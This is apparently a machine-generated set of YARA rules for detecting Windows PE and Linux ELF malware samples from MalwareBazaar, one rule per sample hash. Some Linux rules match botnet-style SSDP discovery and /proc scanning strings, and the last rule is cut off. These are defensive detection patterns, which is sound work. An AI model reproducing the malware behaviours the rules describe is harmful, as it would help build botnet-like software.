rule Windows_06e41eef7cd522feb5cd03df1821589f5ed697177c3e9c317cb844a50edbe17d
{
    meta:
        description = "Auto ML: 06e41eef7cd522feb5cd03df1821589f5ed697177c3e9c317cb844a50edbe17d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Project1"
        $s3 = "Timer5"
        $s4 = "Timer4"
        $s5 = "Timer3"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 412KB
        and all of them
}

rule Windows_5777ea688bb402f1f457e10852509ccbe1278a6ff546662516b2f963e8dd5dae
{
    meta:
        description = "Auto ML: 5777ea688bb402f1f457e10852509ccbe1278a6ff546662516b2f963e8dd5dae"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".zukehi"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 294KB
        and all of them
}

rule Windows_5805ba05b4054885a03cfcfaa9a114a9779f588ed93f2ca4ba7a0398645434de
{
    meta:
        description = "Auto ML: 5805ba05b4054885a03cfcfaa9a114a9779f588ed93f2ca4ba7a0398645434de"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Hj^a~a"
        $s5 = "Ya Apz"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1176KB
        and all of them
}

rule Windows_5808dc380418fc0add23fdcd7aeb82a4255955874c8242490d678f962bf0292b
{
    meta:
        description = "Auto ML: 5808dc380418fc0add23fdcd7aeb82a4255955874c8242490d678f962bf0292b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<NodesControl_MouseClick>b__47_10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 667KB
        and all of them
}

rule Windows_581412f08e3333ebe7a4661f982106b1e395d3c8f384107df71db4768faec0c8
{
    meta:
        description = "Auto ML: 581412f08e3333ebe7a4661f982106b1e395d3c8f384107df71db4768faec0c8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "PQhL/B"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 313KB
        and all of them
}

rule Windows_583a2d1876ab1fe9703ac09dcd8a6a67cc86482f443691f343f4b2b4ec29dd0e
{
    meta:
        description = "Auto ML: 583a2d1876ab1fe9703ac09dcd8a6a67cc86482f443691f343f4b2b4ec29dd0e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1210KB
        and all of them
}

rule Windows_583dbeb5648d05035fa5cfebf1539b1537878e68dafd78c29f40058db1605162
{
    meta:
        description = "Auto ML: 583dbeb5648d05035fa5cfebf1539b1537878e68dafd78c29f40058db1605162"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Linux_5847b5c5b873f9a26d1aa449603ab7eb76107d6008ba6ed52fb1eff98fcba2d2
{
    meta:
        description = "Auto ML: 5847b5c5b873f9a26d1aa449603ab7eb76107d6008ba6ed52fb1eff98fcba2d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 149KB
        and all of them
}

rule Windows_5869f52973c259389b302074c98b95068044c557c5f3dc50d3412b4f3108780c
{
    meta:
        description = "Auto ML: 5869f52973c259389b302074c98b95068044c557c5f3dc50d3412b4f3108780c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = ",JHHnP5"
        $s3 = "qyKld}"
        $s4 = "G4OQpOH"
        $s5 = "h^sQ-L"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1447KB
        and all of them
}

rule Linux_58bf0983bd65c872a9560cc43f0fde0c2072c83b809211608719810244a14805
{
    meta:
        description = "Auto ML: 58bf0983bd65c872a9560cc43f0fde0c2072c83b809211608719810244a14805"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "xQHaWj7"
        $s2 = "}ndb@A4"
        $s3 = "D$\" ObV"
        $s4 = "i@0GN[p"
        $s5 = "Ned;Td"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB
        and all of them
}

rule Linux_58fa77f6b8a2d565631eb153ce585d5292056bd44cce5f86edf2a5190208d88e
{
    meta:
        description = "Auto ML: 58fa77f6b8a2d565631eb153ce585d5292056bd44cce5f86edf2a5190208d88e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "4$BUX'9V"
        $s2 = "ff4Jfg"
        $s3 = "!mcjbg`k"
        $s4 = "!~|am!`kz!zm~"
        $s5 = "FA}g`qw2W|u{|w2Cgw`k"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 72KB
        and all of them
}

rule Windows_00c4073d3cece00275c1e1be5147340362b989177852b7980ba31f0c07ae836d
{
    meta:
        description = "Auto ML: 00c4073d3cece00275c1e1be5147340362b989177852b7980ba31f0c07ae836d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Project1"
        $s3 = "Timer5"
        $s4 = "Timer4"
        $s5 = "Timer3"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 413KB
        and all of them
}

rule Windows_070e800de6c83d551f92272fbe848fc5e66ba5865521131eea114fe330f8f0fa
{
    meta:
        description = "Auto ML: 070e800de6c83d551f92272fbe848fc5e66ba5865521131eea114fe330f8f0fa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "O*>zA_k"
        $s3 = "4l1 yTO"
        $s4 = "Z?CYO1~@"
        $s5 = "fK7J3d"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1833KB
        and all of them
}

rule Windows_5931b9bb54cd619e0e0518c4e61654a3c154b59e72428698ea3f381cabaad213
{
    meta:
        description = "Auto ML: 5931b9bb54cd619e0e0518c4e61654a3c154b59e72428698ea3f381cabaad213"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 670KB
        and all of them
}

rule Windows_5982ee2f9702075b4dbc970ed9d8e142830ea74e35554c9e46ebacf2d42702c9
{
    meta:
        description = "Auto ML: 5982ee2f9702075b4dbc970ed9d8e142830ea74e35554c9e46ebacf2d42702c9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.managed"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5666KB
        and all of them
}

rule Windows_59c9c77894c004b5c79f2f6d77744f6f1639c2b5604d1ce6e0e9c42e24adb3a4
{
    meta:
        description = "Auto ML: 59c9c77894c004b5c79f2f6d77744f6f1639c2b5604d1ce6e0e9c42e24adb3a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2704KB
        and all of them
}

rule Windows_59cfbef2d28f5f8df3c98d8525acf710bbad31e3bed87ccb6d8c3d9f5a9d8fe4
{
    meta:
        description = "Auto ML: 59cfbef2d28f5f8df3c98d8525acf710bbad31e3bed87ccb6d8c3d9f5a9d8fe4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 243KB
        and all of them
}

rule Windows_59f63e0e010518db4d6b1d6d1a7e7620fef5e05685d0756112a713278efef5b4
{
    meta:
        description = "Auto ML: 59f63e0e010518db4d6b1d6d1a7e7620fef5e05685d0756112a713278efef5b4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4432KB
        and all of them
}

rule Windows_5a07ce7ac40cf63a88b65828aa2bbcb3e96e623daf3775dbd23c9492e31f76d2
{
    meta:
        description = "Auto ML: 5a07ce7ac40cf63a88b65828aa2bbcb3e96e623daf3775dbd23c9492e31f76d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".vmp`R"
        $s5 = "`.vmp`R"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5893KB
        and all of them
}

rule Linux_5a0b0ae84cb32f1eadd65aa8f0170aace11fb23e8eee730dd6ec23ff80a1155b
{
    meta:
        description = "Auto ML: 5a0b0ae84cb32f1eadd65aa8f0170aace11fb23e8eee730dd6ec23ff80a1155b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "+cAipX"
        $s2 = ".Cho G"
        $s3 = "q=aM(T"
        $s4 = "L0wRJS"
        $s5 = "\\HXn'X"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 39KB
        and all of them
}

rule Windows_5a47f3a1d1f7f121b7407af0e3ad0bbda02a286891f03ef70af2a7e31bdf237c
{
    meta:
        description = "Auto ML: 5a47f3a1d1f7f121b7407af0e3ad0bbda02a286891f03ef70af2a7e31bdf237c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "jXhP1B"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB
        and all of them
}

rule Linux_5a4cc38c57bcf72e2bb845ef9e9da6ecd659b565f46605d158c7205d4f4f587c
{
    meta:
        description = "Auto ML: 5a4cc38c57bcf72e2bb845ef9e9da6ecd659b565f46605d158c7205d4f4f587c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "@wc$Pp"
        $s2 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "HOST: 255.255.255.255:1900"
        $s5 = "MAN: \"ssdp:discover\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 196KB
        and all of them
}

rule Windows_5aad4e2ad582c6fe27f4f7d2a9c526115cf40f9227385cb9e2c5d160c85bf11b
{
    meta:
        description = "Auto ML: 5aad4e2ad582c6fe27f4f7d2a9c526115cf40f9227385cb9e2c5d160c85bf11b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "SQSSSPW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 585KB
        and all of them
}

rule Windows_077f33dfd672e500ae63b6ee7f3da690f49e2b686480a95004833981ec795504
{
    meta:
        description = "Auto ML: 077f33dfd672e500ae63b6ee7f3da690f49e2b686480a95004833981ec795504"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 72991KB
        and all of them
}

rule Linux_5ab1799f88ef9e58b4077c20bfea8711fe38691cc3b9470b7f99e7d21830573f
{
    meta:
        description = "Auto ML: 5ab1799f88ef9e58b4077c20bfea8711fe38691cc3b9470b7f99e7d21830573f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s2 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "HOST: 255.255.255.255:1900"
        $s5 = "MAN: \"ssdp:discover\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 66KB
        and all of them
}

rule Windows_5abd6f4f7252ac98279db7727c79c5600870725fac5f8b883241a0265952fd69
{
    meta:
        description = "Auto ML: 5abd6f4f7252ac98279db7727c79c5600870725fac5f8b883241a0265952fd69"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "* TFsU*"
        $s5 = "uBrP*s"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5060KB
        and all of them
}

rule Windows_5b0c702995fd3915f272423a01bbb4b6bb122736bf523e7e8d79520a5b63c224
{
    meta:
        description = "Auto ML: 5b0c702995fd3915f272423a01bbb4b6bb122736bf523e7e8d79520a5b63c224"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "E~u5mh"
        $s5 = "#A?QGi"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 53248KB
        and all of them
}

rule Windows_5b290612b19981af51b523612c89f1c2d5630e1cd27c78a2617281f46387db65
{
    meta:
        description = "Auto ML: 5b290612b19981af51b523612c89f1c2d5630e1cd27c78a2617281f46387db65"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Portions Copyright (c) 1999,2003 Avenger by NhT"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1247KB
        and all of them
}

rule Linux_5b39f491dcda7d995b7fc7e304641335df795fc3dcc0d97eab76dd075d3b2d64
{
    meta:
        description = "Auto ML: 5b39f491dcda7d995b7fc7e304641335df795fc3dcc0d97eab76dd075d3b2d64"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Rq>-QP"
        $s2 = "{MJF$E"
        $s3 = "\"mC$I7Bj"
        $s4 = ".yfO9Hq"
        $s5 = "1d=vDH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB
        and all of them
}

rule Linux_5b3af2ecc4337e1ab54921de986e662816b5e5a30611584224863fa335a06a69
{
    meta:
        description = "Auto ML: 5b3af2ecc4337e1ab54921de986e662816b5e5a30611584224863fa335a06a69"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "=)h-[0Hyk"
        $s2 = "mxILM*"
        $s3 = "1Uv\"UC"
        $s4 = "<t-FLi"
        $s5 = "8+uBOx&"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 55KB
        and all of them
}

rule Windows_5bd2b2d7fd28e9ae752fd2e5b669d4b7882f733bb22a4217a4822c5325246647
{
    meta:
        description = "Auto ML: 5bd2b2d7fd28e9ae752fd2e5b669d4b7882f733bb22a4217a4822c5325246647"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".nuhik"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 257KB
        and all of them
}

rule Windows_5be02687b7fe9adbd3146c13e7028451143f8c9e8111fc72246d7fa9c4e38fb5
{
    meta:
        description = "Auto ML: 5be02687b7fe9adbd3146c13e7028451143f8c9e8111fc72246d7fa9c4e38fb5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".jpeg_^]"
        $s5 = "`.jpeg_^]"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6042KB
        and all of them
}

rule Linux_5c03686f34066921e1481c0e979f1daf5cab80a850b2c6131e8e3804ad873a7c
{
    meta:
        description = "Auto ML: 5c03686f34066921e1481c0e979f1daf5cab80a850b2c6131e8e3804ad873a7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "V1ZS>K"
        $s2 = "k;j*oQ"
        $s3 = ")tLG*M{"
        $s4 = "q[,`cwA"
        $s5 = "HgkMp/"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB
        and all of them
}

rule Windows_5c1784fd01fbfc4d6f8b93f3992ac9bed50cf3c98a7c7bfeef4148de01eff370
{
    meta:
        description = "Auto ML: 5c1784fd01fbfc4d6f8b93f3992ac9bed50cf3c98a7c7bfeef4148de01eff370"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 772KB
        and all of them
}

rule Windows_078245ad68ac4acc2f059d9c2df2f4bffa4b2e4f40279eba96d6f7581d58fc2e
{
    meta:
        description = "Auto ML: 078245ad68ac4acc2f059d9c2df2f4bffa4b2e4f40279eba96d6f7581d58fc2e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3541KB
        and all of them
}

rule Windows_5c17dd7c936d69c34b6a35aa525221601d58e8c65c44b4d3fa2bbb140c5bde94
{
    meta:
        description = "Auto ML: 5c17dd7c936d69c34b6a35aa525221601d58e8c65c44b4d3fa2bbb140c5bde94"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "\"ffffff."
        $s5 = "ffffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 573KB
        and all of them
}

rule Windows_5c5a76538892b9420e56a8c5f6f7dc8210a46ddbfc85d1f8f0e5bb90f15dc3e0
{
    meta:
        description = "Auto ML: 5c5a76538892b9420e56a8c5f6f7dc8210a46ddbfc85d1f8f0e5bb90f15dc3e0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Stringl"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 284KB
        and all of them
}

rule Linux_5c696750b0891ee5d962f63464c7196cfd23cc6a9c047747c429c4bf2942b765
{
    meta:
        description = "Auto ML: 5c696750b0891ee5d962f63464c7196cfd23cc6a9c047747c429c4bf2942b765"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`La"
        $s2 = "(vmab/"
        $s3 = ".vQllw["
        $s4 = "APe|l3j"
        $s5 = "R#ay!p1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 134KB
        and all of them
}

rule Windows_5c7d5f2261c2faa3edb70a55eb5a53deb84557f80d7fa339d5ec82999f1ed213
{
    meta:
        description = "Auto ML: 5c7d5f2261c2faa3edb70a55eb5a53deb84557f80d7fa339d5ec82999f1ed213"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1276KB
        and all of them
}

rule Linux_5c7fdef43f5e66c9b01cb2f10b821b681bf1e32a187943bd56c94e22f276e7c6
{
    meta:
        description = "Auto ML: 5c7fdef43f5e66c9b01cb2f10b821b681bf1e32a187943bd56c94e22f276e7c6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "T`X(}iJx|c"
        $s2 = "|iJxTc"
        $s3 = "x}ISx9k"
        $s4 = "x}ISx9`"
        $s5 = "}#Kx}e[x8"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB
        and all of them
}

rule Linux_5d1c1302458cd715172c06fb186d4e0281cd1adfb09fa40be22a4b2459f57191
{
    meta:
        description = "Auto ML: 5d1c1302458cd715172c06fb186d4e0281cd1adfb09fa40be22a4b2459f57191"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "9O0Rd8I}"
        $s2 = "b]PP1J"
        $s3 = "DM0W5y"
        $s4 = "YeJOCJm"
        $s5 = "Msi6;Q"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 37KB
        and all of them
}

rule Windows_5d328dcf1ddc636c9d03e6d46b6874a210dafa6217c6b8bdfd4a32978c8f4842
{
    meta:
        description = "Auto ML: 5d328dcf1ddc636c9d03e6d46b6874a210dafa6217c6b8bdfd4a32978c8f4842"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich}Y"
        $s3 = ".awlays"
        $s4 = "`.smile"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4347KB
        and all of them
}

rule Linux_5d3aee76b6021088ba30bc9cedde9a52651461f4a9cba0bef1f926aa1dbff181
{
    meta:
        description = "Auto ML: 5d3aee76b6021088ba30bc9cedde9a52651461f4a9cba0bef1f926aa1dbff181"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/proc/"
        $s2 = "cmdline"
        $s3 = "/proc/%d/net/tcp"
        $s4 = "%*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %x"
        $s5 = "/proc/%d/exe"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 78KB
        and all of them
}

rule Windows_5d6cc4d7e7ce998cf1d7bc8b78f787f9b034ab3dbdf8c91a33ad0233ddef2ac4
{
    meta:
        description = "Auto ML: 5d6cc4d7e7ce998cf1d7bc8b78f787f9b034ab3dbdf8c91a33ad0233ddef2ac4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3071KB
        and all of them
}

rule Windows_5d8702a242d06cfeb840c8a6fbf8d2bdd3f7e2c58f8c1cc0d74135cc9c1baeb4
{
    meta:
        description = "Auto ML: 5d8702a242d06cfeb840c8a6fbf8d2bdd3f7e2c58f8c1cc0d74135cc9c1baeb4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 885KB
        and all of them
}

rule Windows_07b287f1869f3d49a2cc13efbf581cc5c1f640aa64aac4877ee7ac40f971201c
{
    meta:
        description = "Auto ML: 07b287f1869f3d49a2cc13efbf581cc5c1f640aa64aac4877ee7ac40f971201c"
